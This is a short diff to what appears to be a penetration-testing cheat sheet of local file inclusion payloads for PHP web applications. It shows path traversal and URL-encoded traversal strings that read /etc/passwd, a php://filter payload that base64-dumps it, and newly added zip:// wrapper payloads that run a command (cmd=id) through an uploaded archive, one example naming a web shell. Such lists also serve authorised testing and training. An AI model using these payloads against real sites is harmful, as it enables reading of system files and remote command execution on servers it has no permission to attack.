@@ -12,6 +12,11 @@ http://[URL]/?page=[keyword])../../../../../../etc/passwd
 # PHP tag base64 encode
 php://filter/convert.base64-encode/resource=/etc/passwd
 
+# Zip filter
+zip://uploads/upload_1672890542.zip%23[filename inside zip]&cmd=id
+# example /index.php?file=zip://uploads/upload_1672890542.zip%23phpbash
+# example /index.php?file=zip://uploads/upload_1672890542.zip%23cmd&cmd=id
+
 # URL encode
 http://[URL]/?page=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
 
